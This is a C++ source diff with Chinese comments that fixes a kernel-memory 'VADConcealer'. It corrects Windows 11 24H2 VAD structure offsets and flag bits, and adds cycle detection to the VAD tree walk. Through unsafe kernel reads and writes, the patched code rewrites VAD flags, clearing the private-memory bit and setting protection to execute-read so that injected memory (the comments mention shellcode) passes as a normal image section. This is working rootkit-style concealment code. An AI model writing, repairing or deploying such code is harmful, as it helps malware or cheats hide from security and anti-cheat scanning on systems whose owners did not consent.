@@ -7707,25 +7707,41 @@ void KernelDefense::ReapplyAllCallbacks() {
 //                            (UniqueProcessId @0x1D0, ActiveProcessLinks @0x1D8), not hardcoded"
 // ============================================================
 
-// VAD 节点内部偏移量 (RTL_BALANCED_NODE / _MMVAD_SHORT 内部布局, 跨版本稳定)
+// VAD 节点内部偏移量 (RTL_BALANCED_NODE / _MMVAD_SHORT 内部布局)
+// ★ BUILD 567 v3.270 FIX: 修正 Win11 24H2 VadOffsets (vergiliusproject.com 确认)
+//   v3.267 系统卡死根因: VadEndingVpn/PrivateMemoryBit/ProtectionMask 偏移错误
+//   导致遍历读到错误数据 → 死循环 → 系统卡死
 struct VadOffsets {
     // EPROCESS 内部偏移 — 全部运行时动态解析, 不再硬编码
     // (Win10/11 23H2: UniqueProcessId=0x440, ActiveProcessLinks=0x448, VadRoot=0x7D8)
-    // (Win11 24H2:    UniqueProcessId=0x1D0, ActiveProcessLinks=0x1D8, VadRoot=?)
+    // (Win11 24H2:    VadRoot=0x558, vergiliusproject.com 确认)
 
     // _RTL_BALANCED_NODE (embedded in _MMVAD_SHORT) — 跨版本稳定
     static constexpr uint32_t RbnLeft  = 0x00;
     static constexpr uint32_t RbnRight = 0x08;
     static constexpr uint32_t RbnParentEncoded = 0x10;
 
-    // _MMVAD_SHORT (after RTL_BALANCED_NODE at +0x18) — 跨版本稳定
+    // _MMVAD_SHORT (Win11 24H2, vergiliusproject.com 确认)
+    // +0x18 ULONG StartingVpn      (4字节)
+    // +0x1C ULONG EndingVpn        (4字节) ← v3.269 错误: 0x20 (应为 0x1C)
+    // +0x20 UCHAR StartingVpnHigh  (1字节)
+    // +0x21 UCHAR EndingVpnHigh    (1字节)
+    // +0x30 ULONG VadFlags         (4字节)
+    //        +bit0-3   Lock/LockContended/DeleteInProgress/NoChange
+    //        +bit4-6   VadType (3 bits)
+    //        +bit7-11  Protection (5 bits) ← v3.269 错误: bits 19-23
+    //        +bit12-18 PreferredNode (7 bits)
+    //        +bit19-20 PageSize (2 bits)
+    //        +bit21     PrivateMemory (1 bit) ← v3.269 错误: bit 24
     static constexpr uint32_t VadStartingVpn = 0x18;
-    static constexpr uint32_t VadEndingVpn   = 0x20;
-    static constexpr uint32_t VadFlags       = 0x30; // u.LongFlags / u.VadFlags union
+    static constexpr uint32_t VadEndingVpn   = 0x1C;  // ★ v3.270 FIX: 0x20 → 0x1C
+    static constexpr uint32_t VadFlags       = 0x30;  // u.LongFlags / u.VadFlags union
     static constexpr uint32_t VadControlArea = 0x38;
 
-    static constexpr uint64_t PrivateMemoryBit  = 0x01000000ULL; // bit 24 最常见位置
-    static constexpr uint64_t ProtectionMask    = 0x00F80000ULL; // bits 19-23 (5 bits)
+    // ★ v3.270 FIX: PrivateMemoryBit bit24 → bit21 (vergiliusproject.com _MMVAD_FLAGS 确认)
+    static constexpr uint64_t PrivateMemoryBit  = 0x00200000ULL; // bit 21
+    // ★ v3.270 FIX: ProtectionMask bits 19-23 → bits 7-11
+    static constexpr uint64_t ProtectionMask    = 0x00000F80ULL; // bits 7-11 (5 bits)
 };
 
 // ★ BUILD 555: 静态偏移缓存成员定义 (header 中声明)
@@ -7921,10 +7937,12 @@ bool VADConcealer::EnsureVadRootOffset(KernelMemoryAccessor& kma, uint64_t eproc
     };
 
     // 策略 1: 优先尝试已知候选偏移
+    // ★ BUILD 567 v3.270 FIX: 添加 Win11 24H2 VadRoot=0x558 (vergiliusproject.com 确认)
     static const uint32_t knownCandidates[] = {
-        0x7D8,  // Win10 22H2 / Win11 23H2
+        0x558,  // ★ Win11 24H2 (Build 26100) — vergiliusproject.com 确认
+        0x7D8,  // Win10 22H2 / Win11 22H2/23H2
         0x658,  // Win11 备选
-        0x9D8,  // Win11 24H2 候选
+        0x9D8,  // Win11 备选
         0xA20,  // Win11 25H2 候选
         0x6D8,  // Win10 21H2
         0x5D8,  // Win10 20H2
@@ -8040,14 +8058,39 @@ static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, ui
     if (!vadNode || !targetVa) return false;
 
     uint64_t targetVpn = targetVa >> 12;
-    int maxDepth = 128;
+    int maxDepth = 64;  // ★ v3.270: 128 → 64, VAD 树深度通常 < 32
     int traverseCount = 0;  // ★ BUILD 567 v3.264 DIAG: 遍历计数
+
+    // ★ BUILD 567 v3.270 SAFETY: 环检测 — 记录已访问节点, 防止 AVL 树环导致死循环
+    //   v3.267 系统卡死根因: VadOffsets 错误导致遍历跟随错误指针 → 环 → 死循环
+    //   修复: 记录最近 64 个节点地址, 重复访问则判定为环, 立即退出
+    //   注: 使用固定数组 (避免 std::vector 依赖, 减少 shellcode 体积)
+    static const int MAX_VISITED = 64;
+    uint64_t visitedNodes[MAX_VISITED];
+    int visitedCount = 0;
 
     VadDiag("B554:FMVN:enter vadRoot=0x%llX targetVa=0x%llX targetVpn=0x%llX\n",
         (unsigned long long)vadNode, (unsigned long long)targetVa, (unsigned long long)targetVpn);
 
     while (vadNode && maxDepth-- > 0) {
         traverseCount++;
+
+        // ★ BUILD 567 v3.270 SAFETY: 环检测 — 检查是否已访问过此节点
+        bool isCycle = false;
+        for (int i = 0; i < visitedCount; i++) {
+            if (visitedNodes[i] == vadNode) {
+                isCycle = true;
+                break;
+            }
+        }
+        if (isCycle) {
+            VadDiag("B554:FMVN:FAIL cycle detected node=0x%llX (traverse=%d) — ABORT to prevent freeze\n",
+                (unsigned long long)vadNode, traverseCount);
+            return false;
+        }
+        if (visitedCount < MAX_VISITED) {
+            visitedNodes[visitedCount++] = vadNode;
+        }
         // ★ BUILD 567 v3.236 FIX-4: 放宽边界到 [0xFFFF8000..., 0xFFFFFD00...) — 与 validateVadRoot 一致
         //   根因: v3.235 测试 vadRoot=0xFFFFE48DDD3F9FD8 在非分页池扩展区域 (0xFFFF8000-0xFFFFF680),
         //         被原边界 [0xFFFFFC00, 0xFFFFFD00) 拒绝 → FindAndModifyVadNode result=0 → VAD 隐藏失败.
@@ -8065,21 +8108,35 @@ static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, ui
             return false;
         }
 
-        // ★ BUILD 567 v3.230 FIX: 显式检查 ReadKernelVA 返回值 (与 validateVadRoot 一致)
-        // ★ BUILD 567 v3.236 FIX-4: 改用 ReadKernelVAUnsafe — VAD 节点可能在非分页池扩展区域
-        //   (vadRoot=0xFFFFE48D... 在 0xFFFF8000-0xFFFFF680, ReadKernelVA 白名单拒绝)
-        //   ReadKernelVAUnsafe 边界 [0xFFFF8000, 0xFFFFFE00) 覆盖所有内核池区域
-        uint64_t startVpn = 0, endVpn = 0;
-        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadStartingVpn, &startVpn, 8)) {
-            VadDiag("B554:FMVN:FAIL read startVpn vadNode=0x%llX (traverse=%d)\n",
+        // ★ BUILD 567 v3.270 FIX: 正确读取 Win11 24H2 VAD VPN 字段
+        //   _MMVAD_SHORT: +0x18 ULONG StartingVpn (4字节) + +0x20 UCHAR StartingVpnHigh (1字节)
+        //                +0x1C ULONG EndingVpn   (4字节) + +0x21 UCHAR EndingVpnHigh   (1字节)
+        //   完整 VPN = (VpnHigh << 32) | Vpn  (64位)
+        //   v3.269 错误: 读取 8 字节 (包含 VpnHigh 但偏移错误), 导致遍历逻辑错误
+        uint32_t startVpnLow = 0, endVpnLow = 0;
+        uint8_t startVpnHigh = 0, endVpnHigh = 0;
+        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadStartingVpn, &startVpnLow, 4)) {
+            VadDiag("B554:FMVN:FAIL read startVpnLow vadNode=0x%llX (traverse=%d)\n",
                 (unsigned long long)vadNode, traverseCount);
             return false;
         }
-        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadEndingVpn, &endVpn, 8)) {
-            VadDiag("B554:FMVN:FAIL read endVpn vadNode=0x%llX (traverse=%d)\n",
+        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadEndingVpn, &endVpnLow, 4)) {
+            VadDiag("B554:FMVN:FAIL read endVpnLow vadNode=0x%llX (traverse=%d)\n",
                 (unsigned long long)vadNode, traverseCount);
             return false;
         }
+        // ★ v3.270: 读取 VpnHigh 字节 (+0x20 StartingVpnHigh, +0x21 EndingVpnHigh)
+        if (!kma.ReadKernelVAUnsafe(vadNode + 0x20, &startVpnHigh, 1)) {
+            VadDiag("B554:FMVN:FAIL read startVpnHigh (traverse=%d)\n", traverseCount);
+            return false;
+        }
+        if (!kma.ReadKernelVAUnsafe(vadNode + 0x21, &endVpnHigh, 1)) {
+            VadDiag("B554:FMVN:FAIL read endVpnHigh (traverse=%d)\n", traverseCount);
+            return false;
+        }
+        // 合并为完整 64 位 VPN
+        uint64_t startVpn = ((uint64_t)startVpnHigh << 32) | startVpnLow;
+        uint64_t endVpn   = ((uint64_t)endVpnHigh   << 32) | endVpnLow;
 
         // ★ BUILD 567 v3.264 DIAG: 遍历日志 (前 8 次)
         if (traverseCount <= 8) {
@@ -8106,7 +8163,7 @@ static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, ui
 
                 // 设置 Protection = EXECUTE_READ (5), 模拟 .text 段映射
                 flags &= ~VadOffsets::ProtectionMask;
-                flags |= (5ULL << 19); // Protection = 5 = PAGE_EXECUTE_READ
+                flags |= (5ULL << 7);  // ★ v3.270 FIX: Protection bits 7-11, value 5 = PAGE_EXECUTE_READ
 
                 // ★ BUILD 567 v3.236 FIX-4: 改用 WriteUnsafe — VAD 节点可能在非分页池扩展区域
                 kma.WriteUnsafe<uint64_t>(vadNode + VadOffsets::VadFlags, flags);
